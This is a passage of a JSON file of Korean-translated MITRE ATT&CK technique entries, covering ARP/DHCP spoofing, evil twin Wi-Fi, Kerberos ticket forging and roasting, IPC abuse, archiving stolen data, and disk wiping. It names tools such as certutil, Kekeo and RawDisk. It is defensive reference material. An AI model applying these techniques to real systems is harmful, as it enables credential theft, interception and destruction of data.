있습니다.(참조: Sans ARP Spoofing Aug 2003)(참조: Cylance Cleaver)\n\n적대 세력은 ARP 캐시 오염을 사용하여 네트워크 트래픽을 가로채는 수단으로삼을 수 있습니다. 이 활동은 사용자 인증 정보와 같은 데이터를 수집하거나 중계하는 데 사용될 수 있으며, 특히 불안전하고 암호화되지 않은 프로토콜을 통해 전송되는 경우 그렇습니다.(참조: Sans ARP Spoofing Aug 2003)",
      "external_id": "T1557.002",
      "modified": "2022-07-22T18:37:22.176Z",
      "title": "ARP Cache Poisoning",
      "translated": true
    },
    {
      "description": "적대자는 동적 호스트 구성 프로토콜(DHCP) 트래픽을 스푸핑하고 피해자 네트워크에서 악성 DHCP 서버 역할을 하여 네트워크 트래픽을 적대자가 소유한 시스템으로 리디렉션할 수 있습니다. 적대자 중간자(AiTM) 위치를 확보함으로써, 적대자는 전달된 자격 증명을 포함한 네트워크 통신을 수집할 수 있으며, 특히 보안이 없는 비암호화 프로토콜을 통해 전송된 정보를 강조할 수 있습니다. 이는 [네트워크 스니핑](https://attack.mitre.org/techniques/T1040) 또는 [전송된 데이터 조작](https://attack.mitre.org/techniques/T1565/002)과 같은 후속 행동을 가능하게 할 수 있습니다.\n\nDHCP는 클라이언트-서버 모델을 기반으로 하며 두 가지 기능을 가지고 있습니다: DHCP 서버에서 클라이언트로 네트워크 구성 설정을 제공하는 프로토콜과 클라이언트에게 네트워크 주소를 할당하는 메커니즘입니다. (출처: rfc2131) 일반적인 서버-클라이언트 상호작용은 다음과 같습니다:\n\n1. 클라이언트는 `DISCOVER` 메시지를 브로드캐스트합니다.\n\n2. 서버는 사용 가능한 네트워크 주소를 포함한 `OFFER` 메시지로 응답합니다. \n\n3. 클라이언트는 제공된 네트워크 주소를 포함한 `REQUEST` 메시지를 브로드캐스트합니다.\n\n4. 서버는 `ACK` 메시지로 확인하고 클라이언트는 네트워크 구성 매개변수를 수신합니다.\n\n적대자는 피해자 네트워크에서 불법 DHCP 서버로 스푸핑할 수 있으며, 이로 인해 합법적인 호스트는 악성 네트워크 구성을 받을 수 있습니다. 예를 들어, 악성 코드는 DHCP 서버 역할을 하여 피해 컴퓨터에 적대자가 소유한 DNS 서버를 제공할 수 있습니다. (출처: new_rogue_DHCP_serv_malware)(출처: w32.tidserv.g) 이러한 악성 네트워크 구성을 통해 적대자는 AiTM 위치를 확보하고 클라이언트 트래픽을 적대자가 제어하는 시스템을 통해 라우팅하여 클라이언트 네트워크에서 정보를 수집할 수 있습니다.\n\nDHCPv6 클라이언트는 IP 주소가 할당되지 않고도 <code>INFORMATION-REQUEST (code 11)</code> 메시지를 <code>All_DHCP_Relay_Agents_and_Servers</code> 멀티캐스트 주소로 보내 네트워크 구성 정보를 받을 수 있습니다. (출처: rfc3315) 적대자는 자사의 불법 DHCP 서버를 사용하여 이 요청 메시지에 악성 네트워크 구성을 응답할 수 있습니다.\n\n적대자는 AiTM 위치를 설정하는 대신, DHCP 스푸핑을 남용하여 DHCP 소진 공격(즉, [서비스 소진 홍수](https://attack.mitre.org/techniques/T1499/002))을 수행할 수 있습니다. 이는 많은 브로드캐스트 DISCOVER 메시지를 생성하여 네트워크의 DHCP 할당 풀을 소진시키는 방식입니다.",
      "external_id": "T1557.003",
      "modified": "2024-09-12T19:46:04.759Z",
      "title": "DHCP Spoofing",
      "translated": true
    },
    {
      "description": "적대자는 사용자가 악의적인 네트워크에 연결하도록 속이기 위해 겉보기에는 진짜인 Wi-Fi 액세스 포인트를 호스팅할 수 있으며, 이는 [네트워크 스니핑](https://attack.mitre.org/techniques/T1040), [전송 데이터 조작](https://attack.mitre.org/techniques/T1565/002), 또는 [입력 캡처](https://attack.mitre.org/techniques/T1056)와 같은 후속 행동을 지원하는 방법입니다. (출처: Australia ‘Evil Twin’)\n\n합법적인 Wi-Fi 네트워크의 서비스 세트 식별자(SSID)를 사용하여, 사기성 Wi-Fi 액세스 포인트는 기기나 사용자를 악의적인 Wi-Fi 네트워크에 연결하도록 속일 수 있습니다. (출처: Kaspersky evil twin)(출처: medium evil twin) 적대자는 더 강한 신호 세기를 제공하거나 Wi-Fi 액세스 포인트에 대한 접근을 차단하여 피해자 기기가 악의적인 네트워크에 연결하도록 강요하거나 유도할 수 있습니다. (출처: specter ops evil twin) Wi-Fi 파인애플(Wi-Fi Pineapple)이라는 네트워크 보안 감사 및 침투 테스트 도구가 사용 용이성과 더 넓은 범위를 위해 Evil Twin 공격에서 배포될 수 있습니다. 사용자 정의 인증서가 HTTPS 트래픽을 가로채기 위해 사용될 수 있습니다.\n\n유사하게, 적대자는 클라이언트 기기가 알려진 또는 이전에 연결된 네트워크(선호 네트워크 목록 또는 PNL)에 대한 프로브 요청을 보내는 것을 듣고 있을 수 있습니다. 악의적인 액세스 포인트가 프로브 요청을 수신하면, 적대자는 동일한 SSID로 응답하여 신뢰할 수 있는 알려진 네트워크를 모방할 수 있습니다. (출처: specter ops evil twin) 피해자 기기는 응답하는 액세스 포인트가 자신의 PNL에 있는 것으로 착각하고 사기성 네트워크에 연결을 시작하게 됩니다.\n\n악의적인 Wi-Fi 액세스 포인트에 로그인하면 사용자는 피해자의 자격 증명을 캡처하기 위해 가짜 로그인 페이지나 캡티브 포털 웹페이지로 전환될 수 있습니다. 사용자가 사기성 Wi-Fi 네트워크에 로그인하면, 적대자는 네트워크 활동을 모니터링하거나 데이터를 조작하거나 추가 자격 증명을 훔칠 수 있습니다. 공공 Wi-Fi 액세스가 밀집되어 있는 장소, 예를 들어 공항, 커피숍 또는 도서관은 적대자가 불법 Wi-Fi 액세스 포인트를 설정할 목표가 될 수 있습니다.",
      "external_id": "T1557.004",
      "modified": "2024-11-11T18:52:53.686Z",
      "title": "Evil Twin",
      "translated": true
    },
    {
      "description": "공격자는 Kerberos 인증을 교란시키기 위해 Kerberos 티켓을 도용하거나 위조하여 [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)를 사용할 수 있습니다. Kerberos는 현대 Windows 도메인 환경에서 널리 사용되는 인증 프로토콜입니다. Kerberos 환경은 \"영역(realm)\"이라고 불리며, 여기에는 클라이언트, 서비스, 키 분배 센터(KDC)의 세 가지 기본 참여자가 있습니다. 클라이언트는 서비스에 대한 접근을 요청하고, KDC에서 시작된 Kerberos 티켓을 교환함으로써 성공적으로 인증된 후 접근 권한을 부여받습니다. KDC는 인증과 티켓 부여를 모두 책임집니다. 공격자는 티켓을 도용하거나 위조하여 무단 접근을 시도할 수 있습니다.\n\nWindows에서는 내장된 <code>klist</code> 유틸리티를 사용하여 캐시된 Kerberos 티켓을 나열하고 분석할 수 있습니다.",
      "external_id": "T1558",
      "modified": "2024-09-17T19:49:11.455Z",
      "title": "Steal or Forge Kerberos Tickets",
      "translated": true
    },
    {
      "description": "KRBTGT 계정의 비밀번호 해시를 가진 공격자는 Kerberos 티켓 발급 티켓(TGT)을 위조할 수 있으며, 이를 골든 티켓이라고도 합니다.(출처: AdSecurity Kerberos GT 2015년 8월) 골든 티켓은 공격자가 Active Directory 내의 모든 계정에 대한 인증 자료를 생성할 수 있도록 합니다.(출처: CERT-EU Golden Ticket Protection)\n\n골든 티켓을 사용하여 공격자는 특정 리소스에 대한 접근을 가능하게 하는 티켓 발급 서비스(TGS) 티켓을 요청할 수 있습니다. 골든 티켓은 공격자가 TGS를 받기 위해 키 배포 센터(KDC)와 상호작용해야 합니다.(출처: ADSecurity Detecting Forged Tickets)\n\nKDC 서비스는 Active Directory 도메인의 일부인 도메인 컨트롤러에서 실행됩니다. KRBTGT는 Kerberos 키 배포 센터(KDC) 서비스 계정으로, 모든 Kerberos 티켓을 암호화하고 서명하는 책임이 있습니다.(출처: ADSecurity Kerberos and KRBTGT) KRBTGT 비밀번호 해시는 [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) 기법을 사용하여 도메인 컨트롤러에 대한 특권 액세스를 통해 획득할 수 있습니다.",
      "external_id": "T1558.001",
      "modified": "2020-11-05T16:07:03.779Z",
      "title": "Golden Ticket",
      "translated": true
    },
    {
      "description": "목표 서비스 계정(예: SharePoint, MSSQL)의 비밀번호 해시를 가진 공격자는 Kerberos 티켓 발급 서비스(TGS) 티켓, 즉 실버 티켓을 위조할 수 있습니다. Kerberos TGS 티켓은 서비스 티켓으로도 알려져 있습니다.(인용: ADSecurity Silver Tickets)\n\n실버 티켓은 특정 리소스(예: MSSQL)와 해당 리소스를 호스팅하는 시스템에 접근할 수 있도록 해주지만, 골든 티켓보다 범위가 더 제한적입니다. 그러나 골든 티켓과 달리, 실버 티켓을 위조할 수 있는 공격자는 키 배포 센터(KDC)와 상호작용하지 않고 TGS 티켓을 생성할 수 있어 탐지가 더 어려워질 수 있습니다.(인용: ADSecurity Detecting Forged Tickets)\n\n목표 서비스의 비밀번호 해시는 [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) 또는 [Kerberoasting](https://attack.mitre.org/techniques/T1558/003)을 통해 획득할 수 있습니다.",
      "external_id": "T1558.002",
      "modified": "2020-03-25T21:46:46.831Z",
      "title": "Silver Ticket",
      "translated": true
    },
    {
      "description": "적대자는 유효한 Kerberos 티켓 승인 티켓(TGT)을 악용하거나 네트워크 트래픽을 스니핑하여 [무차별 대입 공격](https://attack.mitre.org/techniques/T1110)에 취약할 수 있는 티켓 승인 서비스(TGS) 티켓을 획득할 수 있습니다. (출처: Empire InvokeKerberoast 2016년 10월)(출처: AdSecurity Kerberos 해킹 2015년 12월)\n\n서비스 주체 이름(SPN)은 각 윈도우 서비스 인스턴스를 고유하게 식별하는 데 사용됩니다. 인증을 활성화하기 위해 Kerberos는 SPN이 서비스 로그온 계정(특정 서비스 실행을 위해 지정된 계정)과 연관되도록 요구합니다. (출처: Microsoft Kerberoasting 탐지 2018년 2월)(출처: Microsoft SPN)(출처: Microsoft SetSPN)(출처: SANS Kerberos 공격 2014년 11월)(출처: Harmj0y Kerberoast 2016년 11월)\n\n유효한 Kerberos 티켓 승인 티켓(TGT)을 보유한 적대자는 도메인 컨트롤러(DC)로부터 어떤 SPN에 대해서도 하나 이상의 Kerberos 티켓 승인 서비스(TGS) 서비스 티켓을 요청할 수 있습니다. (출처: Empire InvokeKerberoast 2016년 10월)(출처: AdSecurity Kerberos 해킹 2015년 12월) 이러한 티켓의 일부는 RC4 알고리즘으로 암호화될 수 있으며, 이는 SPN과 연관된 서비스 계정의 Kerberos 5 TGS-REP etype 23 해시가 개인 키로 사용되며, 따라서 오프라인 [무차별 대입 공격](https://attack.mitre.org/techniques/T1110)에 취약하여 평문 자격 증명이 노출될 수 있습니다. (출처: AdSecurity Kerberos 해킹 2015년 12월)(출처: Empire InvokeKerberoast 2016년 10월)(출처: Harmj0y Kerberoast 2016년 11월)\n\n이와 같은 행동은 네트워크 트래픽에서 캡처한 서비스 티켓을 사용하여 수행될 수 있습니다. (출처: AdSecurity Kerberos 해킹 2015년 12월)\n\n해독된 해시는 [지속성](https://attack.mitre.org/tactics/TA0003), [특권 상승](https://attack.mitre.org/tactics/TA0004), [수평 이동](https://attack.mitre.org/tactics/TA0008)을 가능하게 하여 [유효한 계정](https://attack.mitre.org/techniques/T1078)에 대한 접근을 통해 이루어질 수 있습니다. (출처: SANS Kerberos 공격 2014년 11월)",
      "external_id": "T1558.003",
      "modified": "2024-09-23T22:20:10.994Z",
      "title": "Kerberoasting",
      "translated": true
    },
    {
      "description": "공격자는 Kerberos 사전 인증이 비활성화된 계정의 자격 증명을 [비밀번호 크래킹](https://attack.mitre.org/techniques/T1110/002)하여 Kerberos 메시지를 노출할 수 있습니다. (인용: Harmj0y Roasting AS-REPs 2017년 1월)\n\n사전 인증은 오프라인 [비밀번호 크래킹](https://attack.mitre.org/techniques/T1110/002)에 대한 보호를 제공합니다. 사전 인증이 활성화되면, 리소스에 접근을 요청하는 사용자는 암호 해시로 암호화된 타임스탬프와 함께 인증 서버 요청(AS-REQ) 메시지를 도메인 컨트롤러(DC)에 전송하여 통신을 시작합니다. DC가 사용자 비밀번호의 해시로 타임스탬프를 성공적으로 복호화할 수 있는 경우에만, DC는 사용자에게 티켓 부여 티켓(TGT)이 포함된 인증 서버 응답(AS-REP) 메시지를 전송합니다. AS-REP 메시지의 일부는 사용자의 비밀번호로 서명됩니다. (인용: Microsoft Kerberos Preauth 2014)\n\n사전 인증이 없는 각 계정에 대해 공격자는 암호화된 타임스탬프 없이 AS-REQ 메시지를 보내고, 불안전한 알고리즘(예: RC4)으로 암호화된 TGT 데이터를 포함한 AS-REP 메시지를 받을 수 있습니다. 복구된 암호화된 데이터는 [Kerberoasting](https://attack.mitre.org/techniques/T1558/003)와 유사하게 오프라인 [비밀번호 크래킹](https://attack.mitre.org/techniques/T1110/002) 공격에 취약할 수 있으며, 평문 자격 증명을 노출할 수 있습니다. (인용: Harmj0y Roasting AS-REPs 2017년 1월, Stealthbits Cracking AS-REP Roasting 2019년 6월)\n\n특별 권한이 있든 없든 도메인에 등록된 계정은 Windows 도구(예: [PowerShell](https://attack.mitre.org/techniques/T1059/001))와 LDAP 필터를 활용하여 사전 인증이 비활성화된 모든 도메인 계정을 나열하는 데 악용될 수 있습니다. 또는 공격자는 각 사용자에 대해 AS-REQ 메시지를 보낼 수 있습니다. DC가 오류 없이 응답하면 해당 계정은 사전 인증이 필요하지 않으며 AS-REP 메시지는 이미 암호화된 데이터를 포함하고 있습니다. (인용: Harmj0y Roasting AS-REPs 2017년 1월, Stealthbits Cracking AS-REP Roasting 2019년 6월)\n\n크랙된 해시는 [지속성](https://attack.mitre.org/tactics/TA0003), [권한 상승](https://attack.mitre.org/tactics/TA0004), 그리고 [수평 이동](https://attack.mitre.org/tactics/TA0008)을 통해 [유효한 계정](https://attack.mitre.org/techniques/T1078)에 대한 접근을 가능하게 할 수 있습니다. (인용: SANS Attacking Kerberos 2014년 11월)",
      "external_id": "T1558.004",
      "modified": "2024-10-15T15:32:07.850Z",
      "title": "AS-REP Roasting",
      "translated": true
    },
    {
      "description": "위협 행위자들은 자격 증명 캐시 파일(credential cache files) 또는 ccache에 저장된 Kerberos 티켓을 훔치려고 할 수 있습니다. 이러한 파일은 사용자의 활성 세션 자격 증명을 단기적으로 저장하는 데 사용됩니다. ccache 파일은 사용자 인증 시 생성되며 사용자가 자격 증명을 다시 입력하지 않고도 여러 서비스에 접근할 수 있게 합니다.\n\n`/etc/krb5.conf` 구성 파일과 `KRB5CCNAME` 환경 변수는 ccache 항목의 저장 위치를 설정하는 데 사용됩니다. Linux에서는 자격 증명이 일반적으로 `/tmp` 디렉토리에 `krb5cc_%UID%` 또는 `krb5.ccache` 형식의 이름으로 저장됩니다. macOS에서는 ccache 항목이 기본적으로 메모리에 `API:{uuid}` 이름 규칙으로 저장됩니다. 사용자는 일반적으로 `kinit` 명령을 사용하여 주체에 대한 티켓 부여 티켓(Ticket-Granting Ticket, TGT)을 얻고, `klist` 명령을 사용하여 자격 증명 캐시에 현재 보유 중인 티켓을 나열하며, 기타 내장 바이너리와 상호작용합니다.\n\n위협 행위자들은 디스크에 저장된 ccache 파일에서 티켓을 수집하고 사용자의 비밀번호 없이 현재 사용자로 인증하여 [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) 공격을 수행할 수 있습니다. 또한 이러한 티켓을 사용하여 권한 상승을 수행하기 위해 [Privilege Escalation](https://attack.mitre.org/tactics/TA0004)을 할 수 있는 합법적인 사용자를 가장할 수 있습니다. Kekeo와 같은 도구를 통해 위협 행위자들은 ccache 파일을 Windows 형식으로 변환하여 추가적인 [Lateral Movement](https://attack.mitre.org/tactics/TA0008)를 수행할 수 있습니다. macOS에서는 위협 행위자들이 오픈 소스 도구나 Kerberos 프레임워크를 사용하여 ccache 파일과 상호작용하고 낮은 수준의 API를 통해 TGT 또는 서비스 티켓을 추출할 수 있습니다.",
      "external_id": "T1558.005",
      "modified": "2024-10-14T21:26:37.856Z",
      "title": "Ccache Files",
      "translated": true
    },
    {
      "description": "공격자는 프로세스 간 통신(IPC) 메커니즘을 악용하여 로컬 코드 또는 명령 실행을 수행할 수 있습니다. IPC는 일반적으로 프로세스가 데이터를 공유하고 서로 통신하며 실행을 동기화하는 데 사용됩니다. IPC는 또한 프로세스가 순환 대기 패턴에 갇히는 상황인 교착 상태를 피하는 데 일반적으로 사용됩니다.\n\n공격자는 IPC를 악용하여 임의의 코드나 명령을 실행할 수 있습니다. IPC 메커니즘은 운영 체제에 따라 다를 수 있지만, 일반적으로 프로그래밍 언어/라이브러리나 Windows의 [동적 데이터 교환](https://attack.mitre.org/techniques/T1559/002) 또는 [COM(구성 요소 개체 모델)](https://attack.mitre.org/techniques/T1559/001)와 같은 네이티브 인터페이스를 통해 접근할 수 있는 형태로 존재합니다. Linux 환경은 소켓과 파이프와 같은 다양한 IPC 메커니즘을 지원합니다.(인용: Linux IPC) [명령 및 스크립팅 인터프리터](https://attack.mitre.org/techniques/T1059)와 같은 고급 실행 매체도 기본적인 IPC 메커니즘을 활용할 수 있습니다. 공격자는 [원격 서비스](https://attack.mitre.org/techniques/T1021)인 [분산 구성 요소 개체 모델](https://attack.mitre.org/techniques/T1021/003)를 사용하여 원격 IPC 실행을 촉진할 수 있습니다.(인용: Fireeye Hunting COM 2019년 6월)",
      "external_id": "T1559",
      "modified": "2024-09-10T19:06:35.666Z",
      "title": "Inter-Process Communication",
      "translated": true
    },
    {
      "description": "공격자는 로컬 코드 실행을 위해 Windows 구성 요소 객체 모델(COM)를 사용할 수 있습니다. COM은 Windows 응용 프로그램 프로그래밍 인터페이스(API)의 프로세스 간 통신(IPC) 구성 요소로, 소프트웨어 객체 또는 하나 이상의 인터페이스를 구현하는 실행 가능한 코드 간의 상호 작용을 가능하게 합니다.(인용: Fireeye Hunting COM 2019년 6월) COM을 통해 클라이언트 객체는 일반적으로 바이너리 동적 링크 라이브러리(DLL) 또는 실행 파일(EXE)인 서버 객체의 메서드를 호출할 수 있습니다.(인용: Microsoft COM) 원격 COM 실행은 [원격 서비스](https://attack.mitre.org/techniques/T1021)인 [분산 구성 요소 객체 모델](https://attack.mitre.org/techniques/T1021/003)(DCOM)에 의해 촉진됩니다.(인용: Fireeye Hunting COM 2019년 6월)\n\n다양한 COM 인터페이스가 노출되어 있으며, 이를 통해 C, C++, Java 및 [Visual Basic](https://attack.mitre.org/techniques/T1059/005)과 같은 다양한 프로그래밍 언어를 사용하여 임의의 실행을 유도할 수 있습니다.(인용: Microsoft COM) 특정 COM 객체는 코드 실행을 넘어 기능을 직접 수행할 수 있으며, 예를 들어 [예약된 작업/작업 생성](https://attack.mitre.org/techniques/T1053), 파일 없는 다운로드/실행 및 권한 상승 및 지속성과 관련된 기타 적대적 행동을 포함합니다.(인용: Fireeye Hunting COM 2019년 6월)(인용: ProjectZero File Write EoP 2018년 4월)",
      "external_id": "T1559.001",
      "modified": "2021-07-26T22:51:20.448Z",
      "title": "Component Object Model",
      "translated": true
    },
    {
      "description": "적대자는 임의의 명령을 실행하기 위해 Windows 동적 데이터 교환(DDE)을 사용할 수 있습니다. DDE는 애플리케이션 간의 일회성 및/또는 지속적인 프로세스 간 통신(IPC)을 위한 클라이언트-서버 프로토콜입니다. 연결이 설정되면 애플리케이션은 문자열, 워밍 데이터 링크(데이터 항목이 변경될 때 알림) 및 핫 데이터 링크(데이터 항목의 변경 사항 복제)를 포함하는 트랜잭션과 명령 실행 요청을 자율적으로 교환할 수 있습니다.\n\n객체 링크 및 삽입(OLE) 또는 문서 간 데이터 링크 기능은 원래 DDE를 통해 구현되었습니다. DDE는 [구성 요소 개체 모델](https://attack.mitre.org/techniques/T1559/001)에 의해 대체되었지만, 레지스트리 키를 통해 Windows 10 및 Microsoft Office 2016 대부분에서 활성화될 수 있습니다. (인용: BleepingComputer DDE Disabled in Word Dec 2017)(인용: Microsoft ADV170021 Dec 2017)(인용: Microsoft DDE Advisory Nov 2017)\n\nMicrosoft Office 문서는 DDE 명령으로 감염될 수 있으며, 이는 직접적으로 또는 내장 파일을 통해 실행될 수 있으며, [피싱](https://attack.mitre.org/techniques/T1566) 캠페인이나 호스팅된 웹 콘텐츠를 통해 실행을 전달하는 데 사용됩니다. 이 경우 Visual Basic for Applications (VBA) 매크로의 사용을 피할 수 있습니다. (인용: SensePost PS DDE May 2016)(인용: Kettle CSV DDE Aug 2014)(인용: Enigma Reviving DDE Jan 2018)(인용: SensePost MacroLess DDE Oct 2017) 유사하게, 적대자는 CSV 파일 내에 DDE 수식을 삽입하여 피해자 디바이스에서 애플리케이션 및/또는 명령을 실행하도록 감염된 페이로드를 사용할 수 있습니다. 이는 Windows 스프레드시트 프로그램을 통해 열리도록 설계된 것입니다. (인용: OWASP CSV Injection)(인용: CSV Excel Macro Injection)\n\nDDE는 또한 직접적인 [명령 및 스크립팅 인터프리터](https://attack.mitre.org/techniques/T1059)에 접근할 수 없는 손상된 머신에서 작동하는 적대자에 의해 활용될 수 있습니다. DDE 실행은 [원격 서비스](https://attack.mitre.org/techniques/T1021)인 [배포 구성 요소 개체 모델](https://attack.mitre.org/techniques/T1021/003)(DCOM)을 통해 원격으로 호출할 수 있습니다. (인용: Fireeye Hunting COM June 2019)",
      "external_id": "T1559.002",
      "modified": "2023-09-15T18:57:21.881Z",
      "title": "Dynamic Data Exchange",
      "translated": true
    },
    {
      "description": "적대자는 로컬 코드 실행을 위해 악성 콘텐츠를 XPC 서비스 데몬에 제공할 수 있습니다. macOS는 XPC 서비스를 사용하여 XPC 서비스 데몬과 서드파티 애플리케이션의 권한 있는 헬퍼 도구와 같은 다양한 프로세스 간의 기본적인 프로세스 간 통신을 수행합니다. 애플리케이션은 저수준 XPC 서비스 <code>C API</code> 또는 고수준 <code>NSXPCConnection API</code>를 사용하여 루트로 실행되는 XPC 서비스 데몬에 메시지를 전송하여 네트워크 연결과 같이 향상된 권한이 요구되는 작업을 처리합니다. 애플리케이션은 XPC 서비스의 청사진 역할을 하는 프로토콜 정의를 제공할 책임이 있습니다. 개발자는 일반적으로 XPC 서비스를 사용하여 애플리케이션의 안정성과 애플리케이션 클라이언트와 데몬 간의 권한 분리를 제공합니다. (출처: creatingXPCservices)(출처: Designing Daemons Apple Dev)\n\n적대자는 XPC 서비스를 악용하여 악성 콘텐츠를 실행할 수 있습니다. 악성 실행을 요청하는 것은 애플리케이션의 XPC 서비스 핸들러를 통해 전달될 수 있습니다. (출처: CVMServer Vuln)(출처: Learn XPC Exploitation) 여기에는 부적절한 XPC 클라이언트 검증 및/또는 입력 매개변수의 불완전한 위생 처리를 식별하고 악용하여 [권한 상승을 위한 악용](https://attack.mitre.org/techniques/T1068)을 수행하는 것도 포함될 수 있습니다.",
      "external_id": "T1559.003",
      "modified": "2024-10-16T16:14:12.793Z",
      "title": "XPC Services",
      "translated": true
    },
    {
      "description": "적대자는 데이터 수집 후 탈취하기 전에 데이터를 압축 및/또는 암호화할 수 있습니다. 데이터를 압축하면 수집된 데이터를 숨기고 네트워크를 통해 전송되는 데이터 양을 최소화하는 데 도움이 될 수 있습니다. (출처: DOJ GRU 기소 Jul 2018) 암호화는 탐지로부터 탈취되는 정보를 숨기거나 방어자의 검토 시 탈취를 덜 눈에 띄게 만들기 위해 사용될 수 있습니다.\n\n압축과 암호화는 둘 다 탈취 전에 수행되며, 유틸리티, 제3자 라이브러리 또는 맞춤형 방법을 사용하여 수행할 수 있습니다.",
      "external_id": "T1560",
      "modified": "2024-01-20T00:07:58.958Z",
      "title": "Archive Collected Data",
      "translated": true
    },
    {
      "description": "공격자는 데이터 유출 전에 수집된 데이터를 압축하거나 암호화하기 위해 여러 유틸리티를 사용할 수 있습니다. 많은 유틸리티는 데이터를 보다 안전하고 쉽게 전송할 수 있는 형식으로 압축, 암호화 또는 포장하는 기능을 포함하고 있습니다.\n\n공격자는 다양한 유틸리티를 악용하여 데이터 압축 또는 암호화를 수행할 수 있습니다. Linux 및 macOS에서는 <code>tar</code>, Windows 시스템에서는 <code>zip</code>와 같은 일부 타사 유틸리티가 미리 설치되어 있을 수 있습니다.\n\nWindows에서는 <code>diantz</code> 또는 <code>makecab</code>를 사용하여 수집된 파일을 캐비닛(.cab) 파일로 패키징할 수 있습니다. <code>diantz</code>는 원격 위치에서 파일을 다운로드하고 압축하는 데에도 사용될 수 있습니다(즉, [원격 데이터 스테이징](https://attack.mitre.org/techniques/T1074/002)). 또한, Windows의 <code>xcopy</code>는 다양한 옵션을 사용하여 파일과 디렉토리를 복사할 수 있습니다. 추가로 공격자는 [certutil](https://attack.mitre.org/software/S0160)을 사용하여 유출 전에 수집된 데이터를 Base64로 인코딩할 수 있습니다.\n\n공격자는 7-Zip, WinRAR, WinZip와 같은 타사 유틸리티를 사용하여 유사한 활동을 수행할 수도 있습니다.",
      "external_id": "T1560.001",
      "modified": "2023-09-15T19:02:53.995Z",
      "title": "Archive via Utility",
      "translated": true
    },
    {
      "description": "적대자는 데이터 유출 전에 수집한 데이터를 3rd 파티 라이브러리를 사용하여 압축하거나 암호화할 수 있습니다. 데이터 아카이빙에 사용될 수 있는 많은 라이브러리가 존재하며, 여기에는 [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (인용: PyPI RAR), libzip (인용: libzip), 및 zlib (인용: Zlib Github)이 포함됩니다. 대부분의 라이브러리는 데이터를 암호화 및/또는 압축하는 기능을 포함하고 있습니다.\n\n일부 아카이빙 라이브러리는 macOS 및 Linux의 bzip2, Windows의 zip과 같이 시스템에 미리 설치되어 있습니다. 라이브러리는 유틸리티와 다르다는 점에 유의해야 합니다. 라이브러리는 컴파일 시 링크될 수 있지만, 유틸리티는 하위 셸을 생성하거나 유사한 실행 메커니즘이 필요합니다.",
      "external_id": "T1560.002",
      "modified": "2020-03-29T18:27:30.891Z",
      "title": "Archive via Library",
      "translated": true
    },
    {
      "description": "적대자는 유출 이전에 수집된 데이터를 압축하거나 암호화할 수 있으며, 이때 사용자 정의 방법을 사용할 수 있습니다. 적대자는 XOR 암호화나 외부 라이브러리나 유틸리티 참조 없이 구현된 스트림 암호와 같은 사용자 정의 아카이빙 방법을 선택할 수 있습니다. 잘 알려진 압축 알고리즘의 사용자 정의 구현도 사용된 사례가 있습니다.(출처: ESET Sednit Part 2)",
      "external_id": "T1560.003",
      "modified": "2020-03-25T22:48:14.605Z",
      "title": "Archive via Custom Method",
      "translated": true
    },
    {
      "description": "적대자는 시스템이나 네트워크의 자원에 대한 가용성을 방해하기 위해 특정 시스템 또는 네트워크 내의 많은 수의 시스템에서 원시 디스크 데이터를 지우거나 손상시킬 수 있습니다. 디스크에 직접 쓰기 접근 권한이 있는 경우, 적대자는 디스크 데이터의 일부를 덮어쓰려고 할 수 있습니다. 적대자는 임의의 디스크 데이터 부분을 지우거나 마스터 부트 레코드(MBR)와 같은 디스크 구조를 지우는 것을 선택할 수 있습니다. 모든 디스크 섹터를 완전히 지우는 시도가 이루어질 수 있습니다.\n\n네트워크 전체의 가용성 중단을 목표로 하는 작전에서 목표 조직에 대한 영향을 극대화하기 위해, 디스크를 지우기 위해 사용되는 악성코드는 추가 기술인 [유효 계정](https://attack.mitre.org/techniques/T1078), [OS 자격 증명 덤프](https://attack.mitre.org/techniques/T1003), 및 [SMB/Windows 관리자 공유](https://attack.mitre.org/techniques/T1021/002)를 활용하여 네트워크를 통해 전파되는 웜과 유사한 기능을 가질 수 있습니다. (출처: Novetta Blockbuster Destructive Malware)\n\n네트워크 장치에서는 적대자가 [네트워크 장치 CLI](https://attack.mitre.org/techniques/T1059/008) 명령어인 `erase`를 사용하여 장치의 구성 파일 및 기타 데이터를 지울 수 있습니다. (출처: erase_cmd_cisco)",
      "external_id": "T1561",
      "modified": "2023-04-20T18:16:41.942Z",
      "title": "Disk Wipe",
      "translated": true
    },
    {
      "description": "공격자들은 특정 시스템이나 네트워크 내에서 대규모로 스토리지 장치의 내용을 삭제하여 시스템 및 네트워크 자원의 가용성을 방해할 수 있습니다.\n\n공격자들은 스토리지 인터페이스를 통해 데이터를 복구할 수 없도록 스토리지 장치의 내용을 부분적 또는 완전하게 덮어쓸 수 있습니다. (출처: Novetta Blockbuster)(출처: Novetta Blockbuster Destructive Malware)(출처: DOJ Lazarus Sony 2018) 특정 디스크 구조나 파일을 지우는 대신, 파괴적인 의도를 가진 공격자들은 디스크 내용의 임의 부분을 지울 수 있습니다. 디스크 내용을 삭제하기 위해, 공격자들은 하드 드라이브에 직접 접근하여 임의 크기의 디스크 일부를 무작위 데이터로 덮어쓸 수 있습니다. (출처: Novetta Blockbuster Destructive Malware) 공격자들은 또한 [RawDisk](https://attack.mitre.org/software/S0364)와 같은 타사 드라이버를 이용하여 디스크 내용에 직접 접근하는 것으로 관찰되었습니다. (출처: Novetta Blockbuster)(출처: Novetta Blockbuster Destructive Malware) 이 행동은 개별 파일을 삭제하는 [데이터 파괴](https://attack.mitre.org/techniques/T1485)와는 다른 접근입니다.\n\n네트워크 전체 가용성 중단을 목표로 하는 작업에서 대상 조직에 최대 영향을 미치기 위해, 디스크 내용 삭제에 사용되는 악성코드는 [유효 계정](https://attack.mitre.org/techniques/T1078), [OS 자격 증명 덤핑](https://attack.mitre.org/techniques/T1003), 및 [SMB/Windows 관리 공유](https://attack.mitre.org/techniques/T1021/002)와 같은 추가 기술을 활용하여 네트워크 전파가 가능한 웜과 같은 기능을 가질 수 있습니다. (출처: Novetta Blockbuster Destructive Malware)",
      "external_id": "T1561.001",
      "modified": "2024-04-16T13:00:33.303Z",
      "title": "Disk Content Wipe",
      "translated": true
    },
    {
